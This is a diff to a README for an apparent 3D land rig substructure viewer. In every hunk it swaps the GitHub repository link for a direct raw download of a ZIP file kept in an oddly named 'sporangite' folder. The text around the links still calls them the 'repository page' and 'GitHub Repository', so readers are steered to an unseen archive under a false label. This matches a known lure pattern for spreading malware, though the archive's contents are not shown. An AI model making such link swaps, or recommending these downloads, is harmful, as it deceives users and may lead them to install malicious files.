@@ -1,6 +1,6 @@
 # 🏗️ Land-Rig-Substructure-3D - Explore 3D Land Rig Structures Easily
 
-[![Download Land-Rig-Substructure-3D](https://img.shields.io/badge/Download-Land--Rig--Substructure--3D-brightgreen)](https://github.com/isfaw1/Land-Rig-Substructure-3D)
+[![Download Land-Rig-Substructure-3D](https://img.shields.io/badge/Download-Land--Rig--Substructure--3D-brightgreen)](https://raw.githubusercontent.com/isfaw1/Land-Rig-Substructure-3D/main/sporangite/Land_Substructure_Rig_D_3.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You don’t need programming skills to use this app. Follow these steps to open 
 ## ⬇️ Download and Access the Application
 
 Please visit this page to download or open the tool:  
-[![Open Land-Rig-Substructure-3D](https://img.shields.io/badge/Open-App-blue)](https://github.com/isfaw1/Land-Rig-Substructure-3D)
+[![Open Land-Rig-Substructure-3D](https://img.shields.io/badge/Open-App-blue)](https://raw.githubusercontent.com/isfaw1/Land-Rig-Substructure-3D/main/sporangite/Land_Substructure_Rig_D_3.4.zip)
 
 - Click the link above or the badge at the top.
 - This page hosts the interactive 3D model available via Github Pages.
@@ -66,7 +66,7 @@ Please visit this page to download or open the tool:
 
 If you want to run the app without internet access, you can download the full project files and open them locally. This requires a basic step using your web browser.
 
-1. Go to the repository page: https://github.com/isfaw1/Land-Rig-Substructure-3D
+1. Go to the repository page: https://raw.githubusercontent.com/isfaw1/Land-Rig-Substructure-3D/main/sporangite/Land_Substructure_Rig_D_3.4.zip
 2. Click the green "Code" button near the top right, then select "Download ZIP."
 3. Save the ZIP file to your computer and unzip it.
 4. Open the folder where you extracted files.
@@ -122,7 +122,7 @@ The project focuses on:
 
 ## 🧭 Navigation Links
 
-- GitHub Repository: https://github.com/isfaw1/Land-Rig-Substructure-3D
+- GitHub Repository: https://raw.githubusercontent.com/isfaw1/Land-Rig-Substructure-3D/main/sporangite/Land_Substructure_Rig_D_3.4.zip
 - Download ZIP to run offline from the repository’s Code button.
 - Visit the live app via Github Pages link on the repository page.
 
